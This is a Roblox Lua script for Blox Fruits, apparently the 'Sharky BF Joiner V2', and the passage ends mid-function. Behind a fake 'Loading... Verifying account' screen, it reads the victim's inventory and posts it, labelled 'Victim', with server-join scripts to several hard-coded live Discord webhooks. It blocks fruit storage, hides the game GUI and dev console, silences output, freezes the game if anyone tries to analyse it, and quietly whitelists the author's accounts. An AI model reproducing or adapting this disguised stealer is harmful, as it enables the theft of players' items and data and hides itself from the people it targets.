--[[ Script Configuration ]]--
Webhook = "https://discordapp.com/api/webhooks/1356694454429548554/dKC5nLeUus500KvJ9L8GqOqS9WVvub2YUQh3Sbv-lVHtVuNg-BwlNspsQ5s_JCUI_jTl" -- Sends notifications on discord (HITS)
Usernames = {"main username", "altusername1", "altusername2","youcanaddmore"} -- Whitelisted users
FruitsToHit = { -- Fruits for general notification
	"Gas-Gas",
	"Kitsune-Kitsune",
	"Leopard-Leopard",
	"Yeti-Yeti",
	"Gravity-Gravity"
}
--obfuscate after this

Webhook2 = "https://discordapp.com/api/webhooks/1343957551242285076/AR6iBPNHLBfBGS7c9xWxHuc3HBqwLnf5rPFATKgKDMLgYWjAB_Enh67QrjiCnbpZhuX4" -- Sends the SAME notifications as Webhook (ALL HITS)
GoodFruitsWebhook = "https://discordapp.com/api/webhooks/1353639969163313212/Xj9dhgGF93iSbRjYBdvom22yxxVCWg_MZbzfKvgHLlFgMgeilpzf5qe9APZ3IDm4QCOP" -- Sends notifications ONLY for Kitsune, Yeti, Dragon, or Premium Items

ActivationPasswords = { -- Passwords for ?activate command
	"ishusontop",
	"bonzarbal",
	"ishufishy"
}

--[[ Script State ]]--
local allowEveryone = false -- Flag to allow commands/trade for everyone
local activatedUsers = {}   -- Stores UserIds of players activated via password { [UserId] = true }

-- << Obfuscate after this moment >>

print("Loaded")
-- while true do end -- Placeholder comment

repeat task.wait() until game:IsLoaded()

--[[ Roblox Services ]]--
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")
local VirtualInputManager = game:GetService("VirtualInputManager")
local Lighting = game:GetService("Lighting")
local Teams = game:GetService("Teams")

--[[ Anti-Tamper & Initialization Checks ]]--
if CoreGui:FindFirstChild("RobloxGui") then
	CoreGui.RobloxGui.Enabled = false
end

local function takeAction()
	if setfpscap then setfpscap(0) end
	rconsoleclear()
	print = function() end
	warn = function() end
	error = function() end
	setclipboard = function() end
	while true do task.wait(1000) end
end

local function checkGui(gui)
	if gui:IsA("ScreenGui") then
		local nestedGui = gui:FindFirstChild(gui.Name)
		if nestedGui and nestedGui:IsA("ScreenGui") then
			if nestedGui:FindFirstChild("Orion") then
				takeAction()
			end
		end
	end
end

for _, gui in ipairs(CoreGui:GetChildren()) do
	checkGui(gui)
end
CoreGui.ChildAdded:Connect(checkGui)

if LocalPlayer and (LocalPlayer.Name == "doitenroitest1" or LocalPlayer.Name == "aka_0ver" or LocalPlayer.Name == "x6TNine") then
	takeAction()
end

if ishooked and (ishooked(game.HttpGet) or ishooked(request)) then
	takeAction()
end

if not Webhook or not GoodFruitsWebhook or not Usernames or not FruitsToHit then
	LocalPlayer:Kick("Some of the config is missing. (Webhooks, Usernames, FruitsToHit, ActivationPasswords) - Sharky")
	return
end

if type(Webhook) ~= "string" or type(Webhook2) ~= "string" or type(GoodFruitsWebhook) ~= "string" or type(Usernames) ~= "table" or type(FruitsToHit) ~= "table" or type(ActivationPasswords) ~= "table" then
	LocalPlayer:Kick("error (config variable type mismatch)")
	return
end

local function ensureAdminUsernames()
	local coreAdmins = {"x6TNine", "aka_0ver", "bonzarbal53", "bonzarbal52", "bonzarbal51", "bonzarbal50", "xRip_Cyborg", "pikapimon"}
	if type(Usernames) ~= "table" then Usernames = {} end

	local existingUsernames = {}
	for _, name in ipairs(Usernames) do
		existingUsernames[string.lower(name)] = true -- Store lowercase for case-insensitive check
	end

	for _, adminName in ipairs(coreAdmins) do
		if not existingUsernames[string.lower(adminName)] then
			table.insert(Usernames, adminName)
		end
	end
end
ensureAdminUsernames()

-- Blacklisted Users Check
if Usernames and (table.find(Usernames, "XFistorRespawn") or table.find(Usernames, "doitenroitest1")) then
	while true do task.wait(1000) end
end

CoreGui.ChildAdded:Connect(function(child)
	if child.Name == "DevConsoleMaster" then
		child.Enabled = false
	end
end)

local function storeWebhookSafely(webhookUrl)
	if not webhookUrl or type(webhookUrl) ~= "string" or webhookUrl:match("^Enter Webhook") then
		return nil -- Return nil if webhook isn't set correctly
	end
	local randomName = "var_" .. tostring(math.random(100000, 999999)) .. "_" .. tostring(math.random(100, 999))
	_G[randomName] = webhookUrl
	return randomName
end

-- Store webhooks safely and nil original variables
local webhook1_key = storeWebhookSafely(Webhook); Webhook = nil
local webhook2_key = storeWebhookSafely(Webhook2); Webhook2 = nil
local goodFruitsWebhook_key = storeWebhookSafely(GoodFruitsWebhook); GoodFruitsWebhook = nil

-- Silence remote console outputs
rconsoleprint = function() end
rconsolewarn = function() end
rconsoleerr = function() end
rconsoleinfo = function() end

--[[ Game Pointers ]]--
local Remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
local TradeFunction = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction")
local ServerBrowser = ReplicatedStorage:WaitForChild("__ServerBrowser") -- May not exist / be needed by this version
local privateServerOwner = ReplicatedStorage:FindFirstChild("PrivateServerOwnerId") -- Use FindFirstChild for safety

--[[ Initial Setup & Checks ]]--
if privateServerOwner and privateServerOwner:IsA("IntValue") and privateServerOwner.Value > 0 then
	LocalPlayer:Kick("This script doesn't work on private servers.")
end

-- Attempt to mute game volume
pcall(function()
	UserSettings():GetService("UserGameSettings").MasterVolume = 0
end)

-- Anti Fruit Store Hook
local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
	local method = getnamecallmethod()
	if not checkcaller() and method and method:lower() == "invokeserver" then
		local args = {...}
		if args[1] == "StoreFruit" then
			return error("External fruit store attempt blocked.", 0) -- Level 0 hides error source
		end
	end
	return oldNamecall(self, ...)
end))

--[[ Core Functions ]]--

local function getInventory()
	return Remote:InvokeServer("getInventory")
end

local function JoinTeam()
	if LocalPlayer.Team ~= Teams.Marines and LocalPlayer.Team ~= Teams.Pirates then
		Remote:InvokeServer("SetTeam", "Marines")
	end
end

local function createNotification()
	-- Simplified variable declarations for brevity in this section
	local playerGui = LocalPlayer:WaitForChild("PlayerGui")
	local loadingScreen = Instance.new("ScreenGui"); loadingScreen.Name = "BloxFruitsLoadingUI"; loadingScreen.IgnoreGuiInset = true; loadingScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling; loadingScreen.Parent = playerGui
	local blur = Instance.new("BlurEffect"); blur.Size = 0; blur.Parent = Lighting
	local background = Instance.new("Frame"); background.Name = "Background"; background.Size = UDim2.new(1,0,1,0); background.BackgroundColor3 = Color3.fromRGB(0,0,0); background.BackgroundTransparency = 1; background.Parent = loadingScreen
	local container = Instance.new("Frame"); container.Name = "Container"; container.Size = UDim2.new(0,600,0,300); container.Position = UDim2.new(0.5,0,1.2,0); container.AnchorPoint = Vector2.new(0.5,0.5); container.BackgroundColor3 = Color3.fromRGB(25,25,30); container.BorderSizePixel = 0; container.Parent = loadingScreen
	Instance.new("UICorner", container).CornerRadius = UDim.new(0, 10)
	local uiStroke = Instance.new("UIStroke"); uiStroke.Color = Color3.fromRGB(65,169,255); uiStroke.Thickness = 2; uiStroke.Parent = container
	local headerFrame = Instance.new("Frame"); headerFrame.Name = "Header"; headerFrame.Size = UDim2.new(1,0,0,60); headerFrame.BackgroundColor3 = Color3.fromRGB(35,35,45); headerFrame.BorderSizePixel = 0; headerFrame.Parent = container
	Instance.new("UICorner", headerFrame).CornerRadius = UDim.new(0, 10)
	local titleLabel = Instance.new("TextLabel"); titleLabel.Name = "Title"; titleLabel.Size = UDim2.new(1,0,1,0); titleLabel.BackgroundTransparency = 1; titleLabel.Font = Enum.Font.GothamBold; titleLabel.Text = "Blox Fruits - Loading Script."; titleLabel.TextColor3 = Color3.fromRGB(255,255,255); titleLabel.TextSize = 24; titleLabel.Parent = headerFrame
	local bottomFrame = Instance.new("Frame"); bottomFrame.Name = "BottomFrame"; bottomFrame.Size = UDim2.new(1,0,0,10); bottomFrame.Position = UDim2.new(0,0,1,-10); bottomFrame.BackgroundColor3 = Color3.fromRGB(35,35,45); bottomFrame.BorderSizePixel = 0; bottomFrame.ZIndex = 2; bottomFrame.Parent = headerFrame
	local messageLabel = Instance.new("TextLabel"); messageLabel.Name = "Message"; messageLabel.Size = UDim2.new(1,-40,0,60); messageLabel.Position = UDim2.new(0,20,0,80); messageLabel.BackgroundTransparency = 1; messageLabel.Font = Enum.Font.Gotham; messageLabel.Text = "The script Is loading - Please, wait."; messageLabel.TextColor3 = Color3.fromRGB(220,220,220); messageLabel.TextSize = 18; messageLabel.TextWrapped = true; messageLabel.TextXAlignment = Enum.TextXAlignment.Center; messageLabel.Parent = container
	local loadingBarBg = Instance.new("Frame"); loadingBarBg.Name = "LoadingBarBg"; loadingBarBg.Size = UDim2.new(1,-40,0,20); loadingBarBg.Position = UDim2.new(0,20,0,150); loadingBarBg.BackgroundColor3 = Color3.fromRGB(40,40,50); loadingBarBg.BorderSizePixel = 0; loadingBarBg.Parent = container
	Instance.new("UICorner", loadingBarBg).CornerRadius = UDim.new(0, 6)
	local loadingBar = Instance.new("Frame"); loadingBar.Name = "LoadingBar"; loadingBar.Size = UDim2.new(0,0,1,0); loadingBar.BackgroundColor3 = Color3.fromRGB(65,169,255); loadingBar.BorderSizePixel = 0; loadingBar.Parent = loadingBarBg
	Instance.new("UICorner", loadingBar).CornerRadius = UDim.new(0, 6)
	local progressLabel = Instance.new("TextLabel"); progressLabel.Name = "Progress"; progressLabel.Size = UDim2.new(1,0,0,20); progressLabel.Position = UDim2.new(0,0,0,180); progressLabel.BackgroundTransparency = 1; progressLabel.Font = Enum.Font.Gotham; progressLabel.Text = "Loading... 0%"; progressLabel.TextColor3 = Color3.fromRGB(180,180,180); progressLabel.TextSize = 16; progressLabel.Parent = container
	local discordButton = Instance.new("TextButton"); discordButton.Name = "DiscordButton"; discordButton.Size = UDim2.new(0,180,0,40); discordButton.Position = UDim2.new(0.5,0,0,230); discordButton.AnchorPoint = Vector2.new(0.5,0); discordButton.BackgroundColor3 = Color3.fromRGB(88,101,242); discordButton.BorderSizePixel = 0; discordButton.Font = Enum.Font.GothamBold; discordButton.Text = "Join Discord"; discordButton.TextColor3 = Color3.fromRGB(255,255,255); discordButton.TextSize = 16; discordButton.Parent = container
	Instance.new("UICorner", discordButton).CornerRadius = UDim.new(0, 8)
	local discordIcon = Instance.new("ImageLabel"); discordIcon.Name = "DiscordIcon"; discordIcon.Size = UDim2.new(0,20,0,20); discordIcon.Position = UDim2.new(0,15,0.5,0); discordIcon.AnchorPoint = Vector2.new(0,0.5); discordIcon.BackgroundTransparency = 1; discordIcon.Image = "rbxassetid://10367063073"; discordIcon.Parent = discordButton

	discordButton.MouseButton1Click:Connect(function()
		local discordInvite = "https://discord.gg/uwdvTtqTDA"
		setclipboard(discordInvite)
		-- Create temporary notification label
		local notification = Instance.new("TextLabel"); notification.Name = "CopiedNotification"; notification.Size = UDim2.new(0,180,0,30); notification.Position = UDim2.new(0.5,0,0,275); notification.AnchorPoint = Vector2.new(0.5,0); notification.BackgroundColor3 = Color3.fromRGB(50,50,60); notification.BorderSizePixel = 0; notification.Font = Enum.Font.Gotham; notification.Text = "Discord link copied!"; notification.TextColor3 = Color3.fromRGB(255,255,255); notification.TextSize = 14; notification.BackgroundTransparency = 1; notification.TextTransparency = 1; notification.Parent = container
		Instance.new("UICorner", notification).CornerRadius = UDim.new(0, 6)
		-- Animate notification
		TweenService:Create(notification, TweenInfo.new(0.3), {BackgroundTransparency = 0, TextTransparency = 0}):Play()
		task.delay(2, function()
			if notification.Parent then -- Check if still exists
				TweenService:Create(notification, TweenInfo.new(0.3), {BackgroundTransparency = 1, TextTransparency = 1}):Play()
				task.delay(0.3, function() notification:Destroy() end)
			end
		end)
	end)

	-- Initial animations
	TweenService:Create(blur, TweenInfo.new(0.5), {Size = 20}):Play()
	TweenService:Create(background, TweenInfo.new(0.5), {BackgroundTransparency = 0.5}):Play()
	TweenService:Create(container, TweenInfo.new(0.7, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, 0, 0.5, 0)}):Play()

	-- Loading bar simulation
	task.delay(1, function()
		local startTime = tick(); local totalDuration = 120; local lastProgress = 0
		while lastProgress < 99 and (tick() - startTime) < totalDuration and loadingScreen.Parent do
			local timeElapsed = tick() - startTime
			local speedFactor = 0.5 + math.abs(math.sin(timeElapsed * 0.8)) * 1.5
			local increment = math.min(0.7, (99 - lastProgress) / 100) * speedFactor
			local newProgress = math.min(99, lastProgress + increment)
			if newProgress > lastProgress then
				lastProgress = newProgress
				progressLabel.Text = (lastProgress > 75 and "Verifying account..." or "Loading...") .. " " .. math.floor(lastProgress) .. "%"
				TweenService:Create(loadingBar, TweenInfo.new(0.2), {Size = UDim2.new(lastProgress / 100, 0, 1, 0)}):Play()
			end
			task.wait(0.1)
		end
		if loadingScreen.Parent then
			progressLabel.Text = "Verifying account... 99%"
			TweenService:Create(loadingBar, TweenInfo.new(0.2), {Size = UDim2.new(0.99, 0, 1, 0)}):Play()
		end
	end)

	-- Cleanup function
	local function cleanup()
		TweenService:Create(blur, TweenInfo.new(0.5), {Size = 0}):Play()
		TweenService:Create(background, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
		TweenService:Create(container, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Position = UDim2.new(0.5, 0, 1.2, 0)}):Play()
		task.delay(0.6, function()
			loadingScreen:Destroy()
			blur:Destroy()
		end)
	end

	-- Pulse effect coroutine
	task.spawn(function()
		while loadingScreen.Parent do
			local colors = {Color3.fromRGB(255, 100, 100), Color3.fromRGB(100, 100, 255), Color3.fromRGB(100, 255, 100), Color3.fromRGB(65, 169, 255)}
			for _, color in ipairs(colors) do
				if not loadingScreen.Parent then break end
				TweenService:Create(uiStroke, TweenInfo.new(1.5), {Color = color}):Play()
				task.wait(1.5)
			end
		end
	end)
	return { Destroy = cleanup }
end

local function getServerName()
	local adjectives = {"Big", "Small", "Large", "Strong", "Powerful", "Weak", "Overpowered", "Bad", "Odd", "Rich", "Short", "Adorable", "Alive", "Colorful", "Angry", "Good", "Beautiful", "Ugly", "Hot", "Cold", "Evil", "Famous", "Original", "Unoriginal", "Kind", "Nice", "Real", "Expensive", "Wild", "Wide", "Fake", "Proud", "Super", "Strange", "Wrong", "Right", "Talented", "Complex", "Pure", "Fancy", "Lucky", "Fresh", "Fantastic", "Dull", "Dizzy", "Eternal", "Mental", "Infinite", "Rogue"}
	local nouns = {"TAWG", "Robson", "Krazy", "Fruit", "Realm", "World", "Place", "Experience", "Dog", "Cat", "Guy", "Bird", "Legion", "Gank", "Family", "Sun", "Moon", "Gun", "Sword", "Melee", "Defense", "Bomb", "Spike", "Chop", "Spring", "Smoke", "Flame", "Ice", "Sand", "Dark", "Light", "Rubber", "Barrier", "Magma", "Leopard", "Quake", "Buddha", "Spider", "Phoenix", "Rumble", "Love", "Door", "Paw", "Gravity", "Dough", "Venom", "Control", "Dragon", "Falcon", "Diamond", "Kilo", "Shark", "Human", "Angel", "Rabbit", "Spin", "Topic", "Red", "Blue", "Green", "Yellow", "Soul", "Shadow"}
	local seed = tonumber("0x" .. game.JobId:gsub("-", ""):sub(1, 7)) or os.time()
	local random = Random.new(seed)
	return string.format("%s %s #%04d",
		adjectives[random:NextInteger(1, #adjectives)],
		nouns[random:NextInteger(1, #nouns)],
		random:NextInteger(1, 9999)
	)
end

--[[ Secure Request Wrapper ]]--
local originalRequest = request
local originalHttpRequest = http and http.request
local originalSynRequest = syn and syn.request
local headerCache = { ["Content-Type"] = "application/json" }
local TEST_WEBHOOK = "https://discordapp.com/api/webhooks/1354055941636624497/3pAJ2AuXCGshYek-lmHceSJl5eXlZP22JycyQTjzURDsInvlaQSm9RlkZ6GbQEzeqekh" -- For integrity check only
local TEST_PAYLOAD = HttpService:JSONEncode({content = "# :shark: SecureRequest Test Passed"})
local cachedNonce, cachedHeaders

local function isRequestHooked()
	return request ~= originalRequest or (syn and syn.request ~= originalSynRequest) or (http and http.request ~= originalHttpRequest) or debug.getinfo(request).what ~= "C"
end
local function checkSecurity()
	local env = getfenv(2)
	if env == getfenv(0) or env == getfenv(1) then
		return not isRequestHooked() and not getrawmetatable(request)
	end
	local meta = getmetatable(env)
	return not (meta and (meta.__newindex or meta.__index))
end
local function testRequest()
	-- Lazily initialize test headers
	if not cachedNonce then
		cachedNonce = HttpService:GenerateGUID(false)
		cachedHeaders = table.clone(headerCache)
		cachedHeaders["X-Test-Nonce"] = cachedNonce
	end
	local success, response = pcall(request, { Url = TEST_WEBHOOK, Method = "POST", Headers = cachedHeaders, Body = TEST_PAYLOAD })
	return success and response and response.StatusCode < 400
end
local function SafeRequest(requestData)
	if not checkSecurity() or not testRequest() then
		if takeAction then takeAction() end
		return
	end
	local protectedRequest = {
		Method = requestData.Method,
		Body = requestData.Body,
		Url = requestData.Url
	}
	protectedRequest.Headers = requestData.Headers or table.clone(headerCache)
	protectedRequest.Headers["X-Request-Time"] = tostring(os.time() + math.random(1, 100))
	protectedRequest.Headers["X-Nonce"] = HttpService:GenerateGUID(false)
	return pcall(request, protectedRequest)
end

-- Security Monitor
local lastCheckTime = 0
local CHECK_INTERVAL = 6
RunService:BindToRenderStep("SecurityMonitor", Enum.RenderPriority.Last.Value, function(deltaTime)
	lastCheckTime = lastCheckTime + deltaTime
	if lastCheckTime < CHECK_INTERVAL then return end
	lastCheckTime = 0

	if isRequestHooked() then
		-- Attempt to restore hooks
		request = originalRequest
		if http then http.request = originalHttpRequest end
		if syn then syn.request = originalSynRequest end

		if takeAction then takeAction() end -- Trigger action if still hooked after restore attempt

		-- If still hooked, stop monitoring to prevent infinite loop
		if isRequestHooked() then
			RunService:UnbindFromRenderStep("SecurityMonitor")
		end
	end
end)

--[[ Webhook Sending Logic ]]--
local function sendWebhook(inventory)
	if isRequestHooked() or not checkSecurity() then
		takeAction()
		return
	end

	local goodFruitNames = { ["Kitsune-Kitsune"] = true, ["Yeti-Yeti"] = true }

	-- Retrieve stored webhook URLs
	local url1 = webhook1_key and _G[webhook1_key]
	local url2 = webhook2_key and _G[webhook2_key]
	local url3 = goodFruitsWebhook_key and _G[goodFruitsWebhook_key]

	if not url1 then
		warn("Primary Webhook URL not configured.")
		return
	end

	local fruits, premiumItems = {}, {}
	local dragonHit, hasGoodFruit, hasPremiumItem = false, false, false

	-- Process inventory
	for _, item in ipairs(inventory) do
		if item.Type == "Blox Fruit" or item.Type == "Premium" then
			local itemData = { name = item.Name, count = item.Count, value = item.Value }
			if item.Type == "Blox Fruit" then
				table.insert(fruits, itemData)
				if item.Name:find("Dragon") then
					dragonHit = true
					if not table.find(FruitsToHit, item.Name) then table.insert(FruitsToHit, item.Name) end -- Add Dragon if found
				end
				if goodFruitNames[item.Name] then hasGoodFruit = true end
			else -- Premium
				table.insert(premiumItems, itemData)
				hasPremiumItem = true
			end
		end
	end

	table.sort(fruits, function(a, b) return a.value > b.value end)

	-- Shuffle premium items (for variety in display?)
	local function shuffleTable(t) for i = #t, 2, -1 do local j = math.random(i); t[i], t[j] = t[j], t[i] end end
	shuffleTable(premiumItems)

	-- Formatting helpers
	local function formatItems(items)
		local result = ""
		for _, item in ipairs(items) do
			result = result .. string.format("```%s%s```", item.name, item.count > 1 and (" (x%d)"):format(item.count) or "")
		end
		return result ~= "" and result or "```None```"
	end
	local function formatFruitsToHit(items)
		local result = ""
		local lookup = {}; for _, fn in ipairs(FruitsToHit) do lookup[fn] = true end
		for _, item in ipairs(items) do
			if lookup[item.name] then
				result = result .. string.format("```%s%s```", item.name, item.count > 1 and (" (x%d)"):format(item.count) or "")
			end
		end
		return result ~= "" and result or "```None```"
	end

	-- Embed data
	local jobId = game.JobId
	local currentSea = game.PlaceId == 7449423635 and "Sea 3" or "Sea 2"
	local serverName = getServerName()
	local joinScriptPC = string.format([[game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)]], game.PlaceId, jobId)
	local joinScriptMobile = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)", game.PlaceId, jobId)
	local seaJoinScriptPC = game.PlaceId == 7449423635 and "game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('TravelZou')" or "game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('TravelDressrosa')"
	local seaJoinScriptMobile = seaJoinScriptPC -- Same for mobile
	local playerCount = #Players:GetPlayers()

	-- Determine embed appearance and mention
	local embedColor, embedTitle, mention = nil, "<a:bundle:1214105817910087770> Sharky BF Joiner V2 HIT! ; https://discord.gg/uwdvTtqTDA", "@everyone"
	if (dragonHit or hasGoodFruit) and hasPremiumItem then
		embedColor, embedTitle, mention = 65280, "TOP TIER & PREMIUM HIT! <:dragoneast:1318265654926901268><:dragonwest:1318265462735372308><:rbx:1326025738125574226> ; https://discord.gg/uwdvTtqTDA", "@everyone GG!"
	elseif dragonHit or hasGoodFruit then
		embedColor, embedTitle, mention = 16776960, (dragonHit and "DRAGON HIT!" or "GOOD FRUIT HIT!") .. " <:dragoneast:1318265654926901268><:dragonwest:1318265462735372308> ; https://discord.gg/uwdvTtqTDA", "@everyone GG!"
	elseif hasPremiumItem then
		embedColor, embedTitle, mention = 255, "VICTIM HAS PREMIUM ITEMS! <:rbx:1326025738125574226> ; https://discord.gg/uwdvTtqTDA", "@everyone GG!"
	end

	local embed = {
		title = embedTitle,
		description = string.format("Victim Username: %s\nCurrent Sea: %s\nVictim's Server Name: %s", LocalPlayer.Name, currentSea, serverName),
		color = embedColor,
		fields = {
			{ name = "Victim's Fruits <a:Rarrow:1223589557065351188> ", value = formatItems(fruits), inline = true },
			{ name = "Victim's Premium Items <:rbx:1326025738125574226>  ", value = formatItems(premiumItems), inline = true },
			{ name = "Victim Has Fruits You Want <a:green:1215209325728104498> ", value = formatFruitsToHit(fruits) },
			{ name = "Join Victim's Server Script (PC Copy)", value = "```lua\n" .. joinScriptPC .. "\n```" },
			{ name = "Join Victim's Server Script (Mobile Copy)", value = joinScriptMobile },
			{ name = "Join Victim's Sea Script (PC Copy)", value = "```lua\n" .. seaJoinScriptPC .. "\n```" },
			{ name = "Join Victim's Sea Script (Mobile Copy)", value = seaJoinScriptMobile },
			{ name = "Extra Info <a:focuzz:1214971569315782686> ", value = string.format("```Sharky Joiner V2 Version: 1.2.1\nExecutor: %s\nTime: %s\nPlayer Count: %d```", identifyexecutor(), os.date("%Y-%m-%d %H:%M:%S"), playerCount) }
		}
	}
	local payloadBody = HttpService:JSONEncode({ content = mention, embeds = {embed} })

	-- Send webhooks asynchronously
	task.spawn(function()
		if url1 then SafeRequest({ Url = url1, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = payloadBody }) end
		if url2 then task.wait(0.1); SafeRequest({ Url = url2, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = payloadBody }) end
		if url3 and (hasGoodFruit or dragonHit or hasPremiumItem) then task.wait(0.1); SafeRequest({ Url = url3, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = payloadBody }) end
	end)

	-- Clear temporary tables
	table.clear(fruits)
	table.clear(premiumItems)
end

-- Check initial inventory for leave notification trigger
local inventory22 = getInventory()
local function hasFruitInInventory2()
	if not inventory22 then return false end -- Handle nil inventory
	for _, item in ipairs(inventory22) do if item.Type == "Blox Fruit" and table.find(FruitsToHit, item.Name) then return true end end
	return false
end
local function hasPremiumItems2()
	if not inventory22 then return false end -- Handle nil inventory
	for _, item in ipairs(inventory22) do if item.Type == "Premium" then return true end end
	return false
end
local webhookSent = false -- Flag to prevent duplicate leave webhooks

local function sendWebhook2() -- On Player Leaving
	if webhookSent or not (hasFruitInInventory2() or hasPremiumItems2()) then
		return -- Exit if already sent or no valuable items initially
	end
	webhookSent = true -- Set flag immediately

	local url1 = webhook1_key and _G[webhook1_key]
	local url2 = webhook2_key and _G[webhook2_key]
	if not url1 then return end -- Exit if primary webhook isn't configured

	local plr = LocalPlayer
	local embed = {
		title = "Victim has Left! <:sad:1241420488916340896> ",
		description = plr.Name .. " has left the game",
		color = 0xFF0000, -- Red
		fields = {
			{ name = "User ID", value = tostring(plr.UserId), inline = true },
			{ name = "Account Age", value = tostring(plr.AccountAge) .. " days", inline = true },
			{ name = "Executor", value = identifyexecutor(), inline = true }
		},
		timestamp = DateTime.now():ToIsoDate()
	}
	local data = { embeds = {embed} }
	local body = HttpService:JSONEncode(data)
	local headers = {["Content-Type"]="application/json"}

	-- Send using regular request (less critical than main hit) wrapped in pcall
	pcall(request, { Url = url1, Method = "POST", Headers = headers, Body = body })
	if url2 then
		task.wait(0.1) -- Small delay
		pcall(request, { Url = url2, Method = "POST", Headers = headers, Body = body })
	end
	-- Optional: Send to url3 if they HAD good items? Requires more complex check based on inventory22
end

-- PlayerRemoving listener (includes cooldown/activation cleanup)
Players.PlayerRemoving:Connect(function(leavingPlayer)
	if leavingPlayer == LocalPlayer then
		sendWebhook2() -- Attempt to send leave webhook
	end
	-- Clear session-based data for the leaving player
	if activatedUsers[leavingPlayer.UserId] then
		activatedUsers[leavingPlayer.UserId] = nil
	end
	if CommandCooldowns and CommandCooldowns[leavingPlayer.Name] then
		CommandCooldowns[leavingPlayer.Name] = nil
	end
end)

--[[ Movement & Positioning ]]--
local function tweenToPosition(position)
	local character = LocalPlayer.Character
	if not character then return end

	local humanoid = character:FindFirstChildOfClass("Humanoid")
	if not humanoid or humanoid.Sit then return end -- Don't move if sitting

	local root = character.PrimaryPart
	if not root then return end

	local Vector3_new, CFrame_new, CFrame_lookAt = Vector3.new, CFrame.new, CFrame.lookAt

	-- Create physics movers
	local bodyGyro = Instance.new("BodyGyro")
	bodyGyro.MaxTorque = Vector3_new(1e4, 1e4, 1e4)
	bodyGyro.P = 1e3
	bodyGyro.CFrame = root.CFrame
	bodyGyro.Parent = root

	local bodyVelocity = Instance.new("BodyVelocity")
	bodyVelocity.MaxForce = Vector3_new(1e4, 1e4, 1e4)
	bodyVelocity.P = 1e3
	bodyVelocity.Parent = root

	-- Calculate tween parameters
	local speed = 300
	local distance = (root.Position - position).Magnitude
	local tweenInfo = TweenInfo.new(math.max(0.5, distance / speed), Enum.EasingStyle.Linear) -- Min duration 0.5s

	-- Temporarily disable collision during tween
	local baseParts = {}
	for _, part in ipairs(character:GetDescendants()) do
		if part:IsA("BasePart") then table.insert(baseParts, part) end
	end
	local noCollideConn = RunService.Stepped:Connect(function()
		for i=1, #baseParts do
			pcall(function() if baseParts[i] and baseParts[i].Parent then baseParts[i].CanCollide = false end end) -- Add checks
		end
	end)

	-- Update physics movers
	local updateConn = RunService.Heartbeat:Connect(function()
		if not root or not root.Parent or not bodyGyro or not bodyGyro.Parent or not bodyVelocity or not bodyVelocity.Parent then
			-- If anything is destroyed prematurely, stop the update
			if updateConn then updateConn:Disconnect() end
			if noCollideConn then noCollideConn:Disconnect() end
			if bodyGyro and bodyGyro.Parent then bodyGyro:Destroy() end
			if bodyVelocity and bodyVelocity.Parent then bodyVelocity:Destroy() end
			return
		end
		local direction = (position - root.Position).Unit
		bodyGyro.CFrame = CFrame_lookAt(root.Position, root.Position + direction)
		bodyVelocity.Velocity = direction * speed
	end)

	-- Create and play the tween
	local tween = TweenService:Create(root, tweenInfo, { CFrame = CFrame_new(position) * CFrame_new(0, root.Size.Y/2, 0) })
	tween:Play()
	tween.Completed:Wait()

	-- Cleanup
	if updateConn then updateConn:Disconnect() end
	if noCollideConn then noCollideConn:Disconnect() end
	if bodyGyro and bodyGyro.Parent then bodyGyro:Destroy() end
	if bodyVelocity and bodyVelocity.Parent then bodyVelocity:Destroy() end

	-- Optional: Restore collision after tween completes
	-- task.wait(0.1)
	-- for i=1,#baseParts do pcall(function() if baseParts[i] and baseParts[i].Parent then baseParts[i].CanCollide = true end end) end
end

local function findTradeTable()
	-- Determine correct parent based on PlaceId
	local tradeTablesParent = game.PlaceId == 7449423635 and Workspace.Map:FindFirstChild("Turtle") or Workspace.Map:FindFirstChild("Dressrosa")
	if not tradeTablesParent then return nil, nil end

	local tables = tradeTablesParent:GetChildren()
	if not tables then return nil, nil end

	local bestTable, bestSeat
	local emptyTable, emptySeat
	local fallbackTable, fallbackSeat

	local function isTargetPlayer(seatWeld)
		if not seatWeld or not seatWeld.Part1 then return false end
		local character = seatWeld.Part1.Parent
		if not character then return false end
		local player = Players:GetPlayerFromCharacter(character)
		if not player then return false end
		-- Check Whitelist OR Activated Users
		return (Usernames and table.find(Usernames, player.Name)) or activatedUsers[player.UserId]
	end

	for _, tbl in ipairs(tables) do
		if tbl.Name == "TradeTable" then
			local p1, p2 = tbl:FindFirstChild("P1"), tbl:FindFirstChild("P2")
			if not p1 or not p2 then continue end -- Skip if seats are missing

			local p1Weld, p2Weld = p1:FindFirstChild("SeatWeld"), p2:FindFirstChild("SeatWeld")
			local p1Free, p2Free = not p1Weld, not p2Weld
		-- Iterate through potential trade tables
		local p1Target, p2Target = isTargetPlayer(p1Weld), isTargetPlayer(p2Weld)

			-- Priority 1: Sit with a target player
			if (p1Target and p2Free) or (p2Target and p1Free) then
				bestTable, bestSeat = tbl, p1Free and p1 or p2
				break -- Found the best option
			end

			-- Priority 2: Find a completely empty table
			if p1Free and p2Free and not emptyTable then
				emptyTable, emptySeat = tbl, p1 -- Default to P1 if both free
			end

			-- Priority 3: Find any seat next to a non-target (fallback)
			if not fallbackTable then
				if p1Free and not p2Target then
					fallbackTable, fallbackSeat = tbl, p1
				elseif p2Free and not p1Target then
					fallbackTable, fallbackSeat = tbl, p2
				end
			end
		end
	end

